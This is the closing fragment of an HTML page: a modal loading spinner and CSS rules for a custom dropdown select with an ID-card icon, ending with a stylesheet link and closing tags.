              </div>
          </div>
      </div>




    <div class="modal fade" id="modalSpinner" data-backdrop="static" data-keyboard="false" tabindex="-1" role="dialog" aria-labelledby="modalSpinner" aria-hidden="true">
		      <div id="floatingBarsG">
				<div class="blockG" id="rotateG_01"></div>
				<div class="blockG" id="rotateG_02"></div>
				<div class="blockG" id="rotateG_03"></div>
				<div class="blockG" id="rotateG_04"></div>
				<div class="blockG" id="rotateG_05"></div>
				<div class="blockG" id="rotateG_06"></div>
				<div class="blockG" id="rotateG_07"></div>
				<div class="blockG" id="rotateG_08"></div>
			</div>
	</div>    

  </div>

  <style>
    /*the container must be positioned relative:*/
    .custom-select {
        position: relative;
        font-family: Arial;
    }
    .custom-select.document .select-selected{
        background-image: url(resources/img/cedula.png);
        background-position: 95% 0.4em;
        background-repeat: no-repeat;
        background-size: 0.8rem;"
    }

    .custom-select select {
        display: none; /*hide original SELECT element:*/
    }

    .select-selected {
        display: table-cell;
        background-color: white;
        vertical-align: middle;
        /* width: 22em; */
        display: inline-block;
        padding-top: 1em;
    }


    /*style the arrow inside the select element:*/
    .select-selected:after {
        position: absolute;
        content: ">";
        top: 5px;
        right: 10px;
        width: 0;
        height: 0;
        border: 6px solid transparent;
        border-color: #fff transparent transparent transparent;
    }



    /*style the items (options), including the selected item:*/
    .select-items div,.select-selected {
        color: black;

    }

    /*style items (options):*/
    .select-items {
        position: absolute;
        background-color: white;
        top: 100%;
        left: 0;
        right: 0;
        z-index: 99;
        max-height: 10em;
        overflow-y: scroll;
    }
    .select-items div{
        padding: 5px;
    }

    /*hide the items when the select box is closed:*/
    .select-hide {
        display: none;
    }

    .select-items div:hover {
        background-color: red;
    }
</style>
<link href="./index_files/margin.css" rel="stylesheet">

  </div>



</body></html>